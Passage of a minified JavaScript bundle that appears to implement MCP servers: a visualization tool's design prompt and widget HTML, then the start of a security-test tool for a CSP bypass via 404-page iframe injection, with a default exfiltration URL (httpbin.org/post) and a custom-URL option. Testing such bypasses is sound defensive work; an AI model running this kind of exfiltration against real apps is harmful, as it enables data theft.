amber, step 3 = red...). Instead:\n- Group nodes by **category** — all nodes of the same type share one color. E.g. in a vaccine diagram: all immune cells = purple, all pathogens = coral, all outcomes = teal.\n- Use **gray for neutral/structural** nodes (start, end, generic steps).\n- Use **2-3 colors per diagram**, not 6+. More colors = more visual noise. A diagram with gray + purple + teal is cleaner than one using every ramp.\n- **Prefer purple, teal, coral, pink** for general diagram categories. Reserve blue, green, amber, and red for cases where the node genuinely represents an informational, success, warning, or error concept — those colors carry strong semantic connotations from UI conventions.\n\n**Text on colored backgrounds:** Always use the 800 or 900 stop from the same ramp as the fill. Never use black, gray, or --color-text-primary on colored fills. For example, text on Blue 50 (#E6F1FB) must use Blue 800 (#0C447C) or 900 (#042C53), not black. This applies to SVG text elements inside colored rects, and to HTML badges, pills, and labels with colored backgrounds.\n\n**Light/dark mode quick pick** — use only stops from the table, never off-table hex values:\n- **Light mode**: 50 fill + 600 stroke + 600 text\n- **Dark mode**: 800 fill + 200 stroke + 100 text\n- Combined with `light-dark()`: `fill="light-dark(50, 800)"` `stroke="light-dark(600, 200)"` `text fill="light-dark(600, 100)"`\n\nExample using Blue ramp:\n```\nfill="light-dark(#E6F1FB, #0C447C)"    ← 50, 800\nstroke="light-dark(#185FA5, #85B7EB)"  ← 600, 200\ntext fill="light-dark(#185FA5, #B5D4F4)" ← 600, 100\n```\nThis pattern works for all 9 ramps — just swap the hex values from the corresponding row.\n\nDon\'t use the UI semantic colors (--color-background-info etc.) in diagrams — those are for HTML UI components only.\n\n**Stroke width:** Use 0.5px strokes for diagram borders and edges — not 1px or 2px. Thin strokes feel more refined.\n\n**No rotated text**. No `<defs>` content other than the arrow marker defined above.\n\n### 2. Interactive explainer — learn how something works\n*"Explain how compound interest works" / "Teach me about sorting algorithms"*\n\nUse `imagine_html` with **editorial layout**: serif prose flows naturally between interactive controls. No card wrapper. Whitespace is the container.\n\n```html\n<div style="padding: 1rem 0;">\n  <h2 style="font-size: 18px; font-weight: 600; margin: 0 0 0.75rem;">How compound interest works</h2>\n  <p style="font-size: 16px; line-height: 1.7; margin: 0 0 1.5rem;">\n    A fixed rate of 7% sounds modest, but over decades the difference is dramatic.\n  </p>\n\n  <div style="display: flex; align-items: center; gap: 12px; margin: 0 0 1.5rem;">\n    <label style="font-family: var(--font-sans); font-size: 14px; color: var(--color-text-secondary);">Years</label>\n    <input type="range" min="1" max="40" value="20" style="flex: 1;" />\n    <span style="font-family: var(--font-sans); font-size: 14px; font-weight: 600; min-width: 24px;">20</span>\n  </div>\n\n  <p style="font-size: 16px; line-height: 1.7; margin: 0 0 1.5rem;">\n    After 20 years, your \xa31,000 grows to \xa33,870.\n  </p>\n\n  <div style="margin: 2rem 0; position: relative; height: 240px;">\n    <canvas id="chart"></canvas>\n  </div>\n</div>\n```\n\nUse `sendPrompt()` to let users ask follow-ups: `sendPrompt(\'What if I increase the rate to 10%?\')`\n\n### 3. Data visualization — charts and analysis\n*"Show me what this data set is telling me" / "Visualize this CSV"*\n\nUse `imagine_html`. Wrap metric summaries in metric card components (see Component Patterns). Charts flow below without cards.\n\n**Chart.js** — use `import Chart from \'https://esm.sh/chart.js/auto\'` in a `<script type="module">`. Canvas cannot resolve CSS variables — use hardcoded hex. Always disable the default legend (`plugins: { legend: { display: false } }`) and build a custom HTML legend instead. See the Charts module for the full pattern.\n\nUse `sendPrompt()` for drill-down: `sendPrompt(\'Break down Q4 by region\')`\n\n### 4. Compare options — decision making\n*"Compare pricing and features of these products" / "Help me choose between React and Vue"*\n\nUse `imagine_html`. Side-by-side card grid for options. Highlight differences with semantic colors. Interactive elements for filtering or weighting.\n\n- Use `repeat(auto-fit, minmax(160px, 1fr))` for responsive columns\n- Each option in a card. Use badges for key differentiators.\n- Add `sendPrompt()` buttons: `sendPrompt(\'Tell me more about the Pro plan\')`\n- Don\'t put comparison tables inside this tool — output them as regular markdown tables in your response text instead. The tool is for the visual card grid only.\n- When one option is recommended or "most popular", accent its card with `border: 2px solid var(--color-border-info)` only (2px is deliberate — the only exception to the 0.5px rule, used to accent featured items) — keep the same background and border as the other cards. Add a small badge (e.g. "Most popular") above or inside the card header using `background: var(--color-background-info); color: var(--color-text-info); font-size: 12px; padding: 4px 12px; border-radius: var(--border-radius-md); corner-shape: squircle`.\n\n### 5. Data record — bounded UI object\n*"Show me a Salesforce contact card" / "Create a receipt for this order"*\n\nUse `imagine_html`. Wrap the entire thing in a single raised card. All content is sans-serif since it\'s pure UI. Use the avatar/initials component (see Component Patterns) for people.\n\n```html\n<div style="padding: 1rem 0;">\n  <div style="background: var(--color-background-primary); border-radius: var(--border-radius-lg); corner-shape: squircle; border: 0.5px solid var(--color-border-tertiary); padding: 1.25rem;">\n    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px;">\n      <div style="width: 44px; height: 44px; border-radius: 50%; background: var(--color-background-info); display: flex; align-items: center; justify-content: center; font-family: var(--font-sans); font-weight: 600; font-size: 14px; color: var(--color-text-info);">MR</div>\n      <div>\n        <p style="font-family: var(--font-sans); font-weight: 600; font-size: 15px; margin: 0;">Maya Rodriguez</p>\n        <p style="font-family: var(--font-sans); font-size: 13px; color: var(--color-text-secondary); margin: 0;">VP of Engineering</p>\n      </div>\n    </div>\n    <div style="border-top: 0.5px solid var(--color-border-tertiary); padding-top: 12px;">\n      <table style="width: 100%; font-family: var(--font-sans); font-size: 13px;">\n        <tr><td style="color: var(--color-text-secondary); padding: 4px 0;">Email</td><td style="text-align: right; padding: 4px 0; color: var(--color-text-info);">m.rodriguez@acme.com</td></tr>\n        <tr><td style="color: var(--color-text-secondary); padding: 4px 0;">Phone</td><td style="text-align: right; padding: 4px 0;">+1 (415) 555-0172</td></tr>\n      </table>\n    </div>\n  </div>\n</div>\n```\n\n### 6. Art and illustration\n*"Draw me a sunset" / "Create a geometric pattern"*\n\nUse `imagine_svg`. Same technical rules (viewBox, safe area) but the aesthetic is different:\n- Fill the canvas — art should feel rich, not sparse\n- Bold colors: mix `--color-text-*` categories for variety (info blue, success green, warning amber)\n- Custom colors via `light-dark(#light, #dark)` when the subject demands it\n- Layer overlapping opaque shapes for depth\n- Organic forms with `<path>` curves, `<ellipse>`, `<circle>`\n- Texture via repetition (parallel lines, dots, hatching) not raster effects\n- Geometric patterns with `<g transform="rotate()">` for radial symmetry\n\n### 7. Anything else\nPick the closest use case above and adapt. When nothing fits cleanly:\n- Default to editorial layout if the content is explanatory\n- Default to card layout if the content is a bounded object\n- All core design system rules still apply\n- Use `sendPrompt()` for any action that benefits from Claude thinking\n';return e.includes("chart")&&(r+="\n### Charts (Chart.js)\n```html\n<div style=\"position: relative; width: 100%; height: 300px;\">\n  <canvas id=\"myChart\"></canvas>\n</div>\n<script type=\"module\">\n  import Chart from 'https://esm.sh/chart.js/auto';\n  new Chart(document.getElementById('myChart'), {\n    type: 'bar',\n    data: { labels: ['Q1','Q2','Q3','Q4'], datasets: [{ label: 'Revenue', data: [12,19,8,15] }] },\n    options: { responsive: true, maintainAspectRatio: false }\n  });\n<\/script>\n```\n\n**Chart.js rules**:\n- Canvas cannot resolve CSS variables. Use hardcoded hex or Chart.js defaults.\n- Wrap `<canvas>` in `<div>` with explicit `height` and `position: relative`.\n- Use `<script type=\"module\">` with `https://esm.sh/` imports. External `<script src>` blocked.\n- Multiple charts: use unique IDs (`myChart1`, `myChart2`). Each gets its own canvas+div pair.\n"),{content:[{type:"text",text:r}]}}return{content:[{type:"text",text:"Unknown tool: ".concat(e)}],isError:!0}}(n,null!=t?t:{})}),n.setRequestHandler(m.OI,()=>({resources:y})),n.setRequestHandler(m.R6,e=>{let{uri:n}=e.params;if(n===h)return{contents:[{uri:h,mimeType:"text/html;profile=mcp-app",text:'<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8" />\n  <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n  <title>Visualize Widget</title>\n  <style id="mcp-host-fonts">/* Fonts injected from hostContext.styles.css.fonts */</style>\n  <style>@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-Regular-Static.otf")\n    format("opentype");\n  font-weight: 400;\n  font-style: normal;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-RegularItalic-Static.otf")\n    format("opentype");\n  font-weight: 400;\n  font-style: italic;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-Medium-Static.otf")\n    format("opentype");\n  font-weight: 500;\n  font-style: normal;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-MediumItalic-Static.otf")\n    format("opentype");\n  font-weight: 500;\n  font-style: italic;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-Semibold-Static.otf")\n    format("opentype");\n  font-weight: 600;\n  font-style: normal;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-SemiboldItalic-Static.otf")\n    format("opentype");\n  font-weight: 600;\n  font-style: italic;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-Bold-Static.otf")\n    format("opentype");\n  font-weight: 700;\n  font-style: normal;\n  font-display: swap;\n}\n@font-face {\n  font-family: "Anthropic Serif";\n  src: url("https://assets.claude.ai/Fonts/AnthropicSerif-Text-BoldItalic-Static.otf")\n    format("opentype");\n  font-weight: 700;\n  font-style: italic;\n  font-display: swap;\n}</style>\n  <style>:root {\n  color-scheme: light dark;\n}\n* {\n  box-sizing: border-box;\n  margin: 0;\n  padding: 0;\n}\nbody {\n  font-family: "Anthropic Serif", Georgia, "Times New Roman", serif;\n  background: transparent;\n}\n/* Short var aliases — saves ~5 tokens per reference */\n:root {\n  --p: var(--color-text-primary);\n  --s: var(--color-text-secondary);\n  --t: var(--color-text-tertiary);\n  --bg2: var(--color-background-secondary);\n  --b: var(--color-border-secondary);\n}\n\n/* SVG utility classes — use class="t" instead of repeating font/fill attrs */\n.t {\n  font-family: var(--font-sans);\n  font-size: 14px;\n  fill: var(--p);\n}\n.ts {\n  font-family: var(--font-sans);\n  font-size: 12px;\n  fill: var(--s);\n}\n.th {\n  font-family: var(--font-sans);\n  font-size: 14px;\n  fill: var(--p);\n  font-weight: 600;\n}\n.box {\n  fill: var(--bg2);\n  stroke: var(--b);\n}\n.arr {\n  stroke: var(--t);\n  fill: none;\n  stroke-width: 1.5;\n}\n.node {\n  cursor: pointer;\n}\n.node:hover rect,\n.node:hover .box {\n  filter: brightness(0.97);\n}\n.node:hover text {\n  opacity: 0.8;\n}\n\nbody {\n  position: relative;\n}\n#container {\n  width: 100%;\n  min-height: 100px;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  position: relative;\n  border-radius: var(--border-radius-lg, 12px);\n  overflow: hidden;\n}\n#container svg {\n  max-width: 100%;\n  height: auto;\n  overflow: visible;\n}\n\n/* Action buttons group (copy + download).\n   hidden attr is removed on tool-input (final) so buttons never show during streaming. */\n#action-btns {\n  position: absolute;\n  top: 8px;\n  right: 8px;\n  z-index: 2147483647;\n  display: flex;\n  gap: 4px;\n  opacity: 0;\n  transition: opacity 0.2s ease;\n}\n/* display:flex above would override UA [hidden] — restore it */\n#action-btns[hidden] {\n  display: none;\n}\nbody:hover #action-btns {\n  opacity: 1;\n}\n#action-btns button {\n  width: 28px;\n  height: 28px;\n  padding: 0;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  border-radius: var(--border-radius-sm, 6px);\n  background: var(--color-background-secondary, #f5f4ed);\n  border: 1px solid var(--color-border-secondary, rgba(0, 0, 0, 0.3));\n  color: var(--color-text-secondary, #3d3d3a);\n  cursor: pointer;\n  transition: background 0.15s ease;\n}\n#action-btns button:hover {\n  background: var(--color-background-tertiary, #faf9f5);\n}\n/* Download button hides until the group is hovered (user hovers copy btn → download slides in) */\n#download-btn {\n  opacity: 0;\n  pointer-events: none;\n  transform: translateX(4px);\n  transition:\n    opacity 0.15s ease,\n    transform 0.15s ease,\n    background 0.15s ease;\n}\n#action-btns:hover #download-btn {\n  opacity: 1;\n  pointer-events: auto;\n  transform: translateX(0);\n}\n#copy-toast {\n  position: fixed;\n  top: 12px;\n  left: 50%;\n  transform: translateX(-50%) translateY(-20px);\n  background: var(--color-background-danger, #f7ecec);\n  color: var(--color-text-danger, #7f2c28);\n  border: 1px solid var(--color-border-danger, #a73d39);\n  font-family: var(--font-sans, system-ui);\n  font-size: 13px;\n  padding: 8px 14px;\n  border-radius: var(--border-radius-md, 8px);\n  pointer-events: none;\n  opacity: 0;\n  transition:\n    opacity 0.2s ease,\n    transform 0.2s ease;\n  z-index: 2147483647;\n  white-space: nowrap;\n}\n#copy-toast.visible {\n  opacity: 1;\n  transform: translateX(-50%) translateY(0);\n}\n\n/* HTML scripts-loading shimmer */\n#container.scripts-loading {\n  pointer-events: none;\n  opacity: 0.7;\n}\n#container.scripts-loading::after {\n  content: "";\n  position: absolute;\n  inset: 0;\n  z-index: 10000;\n  overflow: hidden;\n}\n#container.scripts-loading::before {\n  content: "";\n  position: absolute;\n  top: -50%;\n  left: 0;\n  width: 60%;\n  height: 200%;\n  z-index: 10001;\n  background: linear-gradient(\n    90deg,\n    transparent 0%,\n    light-dark(rgba(0, 0, 0, 0.06), rgba(255, 255, 255, 0.08)) 50%,\n    transparent 100%\n  );\n  animation: scriptsShimmer 2s ease-in-out infinite;\n}\n@keyframes scriptsShimmer {\n  0% {\n    transform: translateX(-100%) rotate(25deg);\n  }\n  100% {\n    transform: translateX(200%) rotate(25deg);\n  }\n}\n.html-widget-glimmer {\n  width: 100%;\n  height: 140px;\n  border-radius: 12px;\n  background-color: light-dark(#e5e3d8, rgba(60, 60, 58, 0.5));\n  position: relative;\n  overflow: hidden;\n  animation: glimmerFadeIn 600ms ease forwards;\n}\n@keyframes glimmerFadeIn {\n  from {\n    opacity: 0;\n  }\n  to {\n    opacity: 1;\n  }\n}\n.html-widget-glimmer-shine {\n  position: absolute;\n  top: 0;\n  left: -100%;\n  width: 100%;\n  height: 100%;\n  background: linear-gradient(\n    90deg,\n    transparent,\n    light-dark(rgba(255, 255, 255, 0.3), rgba(255, 255, 255, 0.08)),\n    transparent\n  );\n  animation: shimmer 1.5s ease-in-out infinite;\n}\n@keyframes shimmer {\n  0% {\n    left: -100%;\n  }\n  100% {\n    left: 100%;\n  }\n}</style>\n  <style id="entry-animation">/* Entry animation for streaming SVG elements.\n   Removed on final render (via getElementById("entry-animation").remove())\n   to not interfere with SVG\'s own animations.\n   Uses CSS individual transform property (scale) to avoid conflicts with SVG transform attribute.\n   Excludes elements with transform/opacity attributes to prevent CSS overriding SVG values. */\n@keyframes svgFadeInScale {\n  from {\n    opacity: 0;\n    scale: 0.95;\n  }\n  to {\n    opacity: 1;\n    scale: 1;\n  }\n}\n#container\n  :where(\n    svg,\n    circle,\n    rect,\n    path,\n    polygon,\n    polyline,\n    line,\n    ellipse,\n    g,\n    text\n  ):not([transform]):not([opacity]) {\n  transition:\n    fill 0.4s ease-out,\n    stroke 0.4s ease-out,\n    opacity 0.4s ease-out;\n  animation: svgFadeInScale 0.5s ease-out;\n  transform-origin: center;\n}</style>\n</head>\n<body>\n  \x3c!-- Pre-defined SVG markers — available to all SVGs via url(#arrow) --\x3e\n  <svg style="position:absolute;width:0;height:0" aria-hidden="true">\n    <defs>\n      <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">\n        <path d="M2 1L8 5L2 9" fill="none" stroke="var(--t)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>\n      </marker>\n    </defs>\n  </svg>\n  <div id="container">\n    <div class="html-widget-glimmer"><div class="html-widget-glimmer-shine"></div></div>\n  </div>\n  <div id="copy-toast"></div>\n  <div id="action-btns" hidden>\n    <button id="download-btn" title="Download"></button>\n    <button id="copy-btn" title="Copy as Image"></button>\n  </div>\n  <script type="module">\n"use strict";\n(() => {\n  var __create = Object.create;\n  var __defProp = Object.defineProperty;\n  var __getOwnPropDesc = Object.getOwnPropertyDescriptor;\n  var __getOwnPropNames = Object.getOwnPropertyNames;\n  var __getProtoOf = Object.getPrototypeOf;\n  var __hasOwnProp = Object.prototype.hasOwnProperty;\n  var __require = /* @__PURE__ */ ((x) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(x, {\n    get: (a, b) => (typeof require !== "undefined" ? require : a)[b]\n  }) : x)(function(x) {\n    if (typeof require !== "undefined") return require.apply(this, arguments);\n    throw Error(\'Dynamic require of "\' + x + \'" is not supported\');\n  });\n  var __copyProps = (to, from, except, desc) => {\n    if (from && typeof from === "object" || typeof from === "function") {\n      for (let key of __getOwnPropNames(from))\n        if (!__hasOwnProp.call(to, key) && key !== except)\n          __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });\n    }\n    return to;\n  };\n  var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(\n    // If the importer is in node compatibility mode or this is not an ESM\n    // file that has been converted to a CommonJS file using a Babel-\n    // compatible transform (i.e. "__esModule" has not been set), then set\n    // "default" to the CommonJS "module.exports" for node compatibility.\n    isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,\n    mod\n  ));\n\n  // src/scripts/mcp-app-helper.ts\n  var app2 = /* @__PURE__ */ (() => {\n    let nextId = 100;\n    return {\n      sendRequest({ method, params }) {\n        const id = nextId++;\n        window.parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");\n        return new Promise((resolve, reject) => {\n          window.addEventListener(\n            "message",\n            function listener(event) {\n              if (event.data?.id === id) {\n                window.removeEventListener("message", listener);\n                if (event.data?.result) {\n                  resolve(event.data.result);\n                } else if (event.data?.error) {\n                  const e = event.data.error;\n                  reject(\n                    new Error(\n                      typeof e === "string" ? e : e.message || JSON.stringify(e)\n                    )\n                  );\n                }\n              }\n            }\n          );\n        });\n      },\n      sendNotification({ method, params }) {\n        window.parent.postMessage({ jsonrpc: "2.0", method, params }, "*");\n      },\n      onNotification(method, handler) {\n        window.addEventListener(\n          "message",\n          function listener(event) {\n            if (event.data?.method === method) {\n              handler(event.data.params);\n            }\n          }\n        );\n      },\n      async requestDisplayMode({ mode }) {\n        return this.sendRequest({\n          method: "ui/request-display-mode",\n          params: { mode }\n        });\n      },\n      setupAutoResize() {\n        new ResizeObserver(() => {\n          const { body, documentElement: html } = document;\n          const htmlStyle = getComputedStyle(html);\n          const rect = body.getBoundingClientRect();\n          const width = Math.ceil(rect.width);\n          const height = Math.ceil(\n            rect.height + (parseFloat(htmlStyle.borderTop) || 0) + (parseFloat(htmlStyle.borderBottom) || 0)\n          );\n          this.sendNotification({\n            method: "ui/notifications/size-changed",\n            params: { width, height }\n          });\n        }).observe(document.body);\n      }\n    };\n  })();\n  window.app = app2;\n\n  // src/scripts/streaming-morph.ts\n  function createStreamingRenderer2(options = {}) {\n    const {\n      stripScripts = false,\n      widgetName = "Widget",\n      shouldRender = () => true\n    } = options;\n    let parserModules = null;\n    let morphdomModule = null;\n    let streamingParser = null;\n    let prevCode = "";\n    async function renderPartial(container2, code) {\n      if (!code) return;\n      if (!parserModules || !morphdomModule) {\n        try {\n          const [htmlparser2, domhandler, domSerializer, morphdom] = await Promise.all([\n            import("https://esm.sh/htmlparser2@9.1.0"),\n            import("https://esm.sh/domhandler@5.0.3"),\n            import("https://esm.sh/dom-serializer@2.0.0"),\n            import("https://esm.sh/morphdom@2.7.4")\n          ]);\n          parserModules = {\n            Parser: htmlparser2.Parser,\n            DomHandler: domhandler.DomHandler,\n            render: domSerializer.default\n          };\n          morphdomModule = morphdom.default;\n        } catch (err) {\n          console.warn(\n            `[${widgetName}] CDN failed, falling back to innerHTML:`,\n            err\n          );\n          container2.innerHTML = code;\n          return;\n        }\n      }\n      if (code.length < prevCode.length || !streamingParser) {\n        const handler = new parserModules.DomHandler();\n        streamingParser = {\n          parser: new parserModules.Parser(handler, {\n            decodeEntities: false,\n            lowerCaseAttributeNames: false,\n            lowerCaseTags: false,\n            recognizeSelfClosing: true\n          }),\n          handler,\n          write(chunk) {\n            this.parser.write(chunk);\n          },\n          serialize() {\n            return parserModules.render(this.handler.root.children, {\n              encodeEntities: false\n            });\n          }\n        };\n        prevCode = "";\n      }\n      const newChunk = code.substring(prevCode.length);\n      if (newChunk) {\n        streamingParser.write(newChunk);\n        prevCode = code;\n      }\n      let serialized = streamingParser.serialize();\n      if (serialized) {\n        if (stripScripts) {\n          serialized = serialized.replace(/<script[\\s\\S]*?<\\/script>/gi, "");\n        }\n        if (shouldRender(serialized)) {\n          const tempContainer = container2.cloneNode(false);\n          tempContainer.innerHTML = serialized;\n          morphdomModule(container2, tempContainer, { childrenOnly: true });\n        }\n      }\n    }\n    return { renderPartial };\n  }\n  window.createStreamingRenderer = createStreamingRenderer2;\n\n  // src/scripts/clipboard-copy.ts\n  var htmlToImage = null;\n  async function loadHtmlToImage() {\n    if (!htmlToImage) {\n      htmlToImage = await import("https://esm.sh/html-to-image@1.11.11");\n    }\n    return htmlToImage;\n  }\n  async function copyToClipboard2(_container) {\n    const lib = await loadHtmlToImage();\n    const target = document.body;\n    const width = target.scrollWidth || 700;\n    const height = target.scrollHeight || 400;\n    const blob = await lib.toBlob(target, { pixelRatio: 2, width, height });\n    if (!blob) throw new Error("Failed to create PNG");\n    const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);\n    if (isSafari) {\n      await navigator.clipboard.write([\n        new ClipboardItem({ "image/png": Promise.resolve(blob) })\n      ]);\n    } else {\n      await navigator.clipboard.write([new ClipboardItem({ "image/png": blob })]);\n    }\n  }\n  window.copyToClipboard = copyToClipboard2;\n\n  // src/scripts/host-init.ts\n  function initHostContext2(result) {\n    const hostContext = result.hostContext;\n    if (!hostContext) return;\n    const styles = hostContext.styles;\n    if (!styles) return;\n    const css = styles.css;\n    if (css?.fonts) {\n      const fontStyle = document.getElementById("mcp-host-fonts");\n      if (fontStyle) {\n        fontStyle.textContent = css.fonts;\n      }\n    }\n    const variables = styles.variables;\n    if (variables) {\n      const style = document.createElement("style");\n      style.id = "mcp-host-variables";\n      style.textContent = ":root {\\n" + Object.entries(variables).map(([key, value]) => "  " + key + ": " + value + ";").join("\\n") + "\\n}";\n      document.head.appendChild(style);\n    }\n  }\n  window.initHostContext = initHostContext2;\n\n  // src/scripts/send-prompt.ts\n  window.sendPrompt = function sendPrompt(text) {\n    app.sendRequest({\n      method: "ui/message",\n      params: { role: "user", content: [{ type: "text", text }] }\n    });\n  };\n\n  // src/scripts/widget-main.ts\n  var IMPLEMENTATION = { name: "visualize widget", version: "1.0.0" };\n  var container = document.getElementById("container");\n  var lastCode = "";\n  var isSvgCode = (code) => code.trimStart().startsWith("<svg");\n  var hasSvgVisuals = (code) => code && /<(rect|circle|ellipse|line|polyline|polygon|path|text|image|use|g|foreignObject)[\\s>]/i.test(\n    code.replace(/<style[\\s\\S]*?<\\/style>/gi, "").replace(/<defs[\\s\\S]*?<\\/defs>/gi, "")\n  );\n  var hasHtmlVisuals = (code) => code && code.replace(/<style[\\s\\S]*?<\\/style>/gi, "").replace(/<script[\\s\\S]*?<\\/script>/gi, "").replace(/\x3c!--[\\s\\S]*?--\x3e/g, "").trim().length > 0;\n  var svgRenderer = createStreamingRenderer({\n    widgetName: "VisualizeWidget-SVG",\n    shouldRender: hasSvgVisuals\n  });\n  var htmlRenderer = createStreamingRenderer({\n    widgetName: "VisualizeWidget-HTML",\n    stripScripts: true,\n    shouldRender: hasHtmlVisuals\n  });\n  var executeScripts = () => {\n    container.querySelectorAll("script").forEach((oldScript) => {\n      const newScript = document.createElement("script");\n      Array.from(oldScript.attributes).forEach(\n        (attr) => newScript.setAttribute(attr.name, attr.value)\n      );\n      newScript.textContent = oldScript.textContent;\n      oldScript.parentNode?.replaceChild(newScript, oldScript);\n    });\n  };\n  var renderFinal = (code) => {\n    if (isSvgCode(code)) {\n      document.getElementById("entry-animation")?.remove();\n      if (hasSvgVisuals(code)) container.innerHTML = code;\n    } else {\n      if (hasHtmlVisuals(code)) {\n        container.innerHTML = code;\n        executeScripts();\n        container.classList.remove("scripts-loading");\n      }\n    }\n  };\n  var renderPartialCode = (code) => {\n    if (isSvgCode(code)) {\n      svgRenderer.renderPartial(container, code);\n    } else {\n      htmlRenderer.renderPartial(container, code);\n      if (code.includes("<script") && hasHtmlVisuals(code)) {\n        container.classList.add("scripts-loading");\n      }\n    }\n  };\n  var nextRequestId = 1;\n  async function connectToHost() {\n    try {\n      window.addEventListener("message", (event) => {\n        try {\n          const data = event.data;\n          if (data && data.jsonrpc === "2.0") {\n            if (data.id === 1 && data.result) {\n              initHostContext(data.result);\n              window.parent.postMessage(\n                {\n                  jsonrpc: "2.0",\n                  method: "ui/notifications/initialized",\n                  params: {}\n                },\n                "*"\n              );\n            }\n          }\n        } catch (err) {\n          console.error("[VisualizeWidget] Error handling message:", err);\n        }\n      });\n      app.onNotification("ui/notifications/tool-input-partial", (params) => {\n        const code = params?.arguments?.code;\n        if (code) renderPartialCode(code);\n      });\n      app.onNotification("ui/notifications/tool-input", (params) => {\n        const code = params?.arguments?.code;\n        if (code) {\n          renderFinal(code);\n          lastCode = code;\n          document.getElementById("action-btns")?.removeAttribute("hidden");\n        }\n      });\n      window.parent.postMessage(\n        {\n          jsonrpc: "2.0",\n          id: nextRequestId++,\n          method: "ui/initialize",\n          params: {\n            protocolVersion: "2025-11-21",\n            appInfo: IMPLEMENTATION,\n            appCapabilities: {}\n          }\n        },\n        "*"\n      );\n      app.setupAutoResize();\n      const copyBtn = document.getElementById("copy-btn");\n      const copyIcon = \'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>\';\n      const checkIcon = \'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--color-text-success, #265b19)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>\';\n      copyBtn.innerHTML = copyIcon;\n      copyBtn.onclick = async () => {\n        try {\n          await copyToClipboard(container);\n          copyBtn.innerHTML = checkIcon;\n          copyBtn.title = "Copied!";\n          setTimeout(() => {\n            copyBtn.innerHTML = copyIcon;\n            copyBtn.title = "Copy as Image";\n          }, 1500);\n        } catch (_err) {\n          const toast = document.getElementById("copy-toast");\n          toast.textContent = "Copy failed \\u2014 try from claude.ai in browser";\n          toast.classList.add("visible");\n          setTimeout(() => toast.classList.remove("visible"), 3e3);\n        }\n      };\n      const downloadBtn = document.getElementById("download-btn");\n      const downloadIcon = \'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>\';\n      downloadBtn.innerHTML = downloadIcon;\n      downloadBtn.onclick = async () => {\n        if (!lastCode) return;\n        const isSvg = isSvgCode(lastCode);\n        const ext = isSvg ? "svg" : "html";\n        const mime = isSvg ? "image/svg+xml" : "text/html";\n        try {\n          const res = await app.sendRequest({\n            method: "ui/download-file",\n            params: {\n              contents: [\n                {\n                  type: "resource",\n                  resource: {\n                    uri: `file:///visualize.${ext}`,\n                    mimeType: mime,\n                    text: lastCode\n                  }\n                }\n              ]\n            }\n          });\n          if (!res?.isError) {\n            downloadBtn.innerHTML = checkIcon;\n            downloadBtn.title = "Downloaded!";\n            setTimeout(() => {\n              downloadBtn.innerHTML = downloadIcon;\n              downloadBtn.title = "Download";\n            }, 1500);\n          }\n        } catch {\n        }\n      };\n    } catch (err) {\n      console.error("[VisualizeWidget] Failed to connect:", err);\n    }\n  }\n  connectToHost();\n})();\n\n  <\/script>\n</body>\n</html>',_meta:{ui:{permissions:{clipboardWrite:{}},csp:{connectDomains:["https://esm.sh"],resourceDomains:["https://esm.sh","https://cdn.jsdelivr.net","https://unpkg.com"]}}}}]};throw Error("Unknown resource: ".concat(n))}),n}let v="ui://mcp-apps-csp-bypass-test/csp-bypass.html";var w=function(e){return e.CSP_BYPASS_TEST="csp_bypass_test",e}(w||{});let x="https://httpbin.org/post";function k(){let e=new u.g({name:"MCP Apps CSP Bypass Test",version:"1.0.0"},{capabilities:{tools:{},resources:{}},jsonSchemaValidator:l.hm});return e.setRequestHandler(m.gW,()=>({tools:[{name:"csp_bypass_test",description:"[SECURITY TEST] Demonstrates CSP bypass via 404 iframe injection. Tests whether scripts injected into a 404 page can bypass connect-src restrictions. With the fix, this attack should be BLOCKED.",inputSchema:{type:"object",properties:{customExfilUrl:{type:"string",description:"Optional custom exfiltration URL to test (default: httpbin.org)"}}},_meta:{"ui/resourceUri":v}}]})),e.setRequestHandler(m.FT,e=>{let{name:n,arguments:t}=e.params;return"csp_bypass_test"===n?{content:[{type:"text",text:"[SECURITY TEST] CSP Bypass Test invoked.\n"+"Exfil URL: ".concat((null==t?void 0:t.customExfilUrl)||x,"\n\n")+"The MCP App will attempt to:\n1. 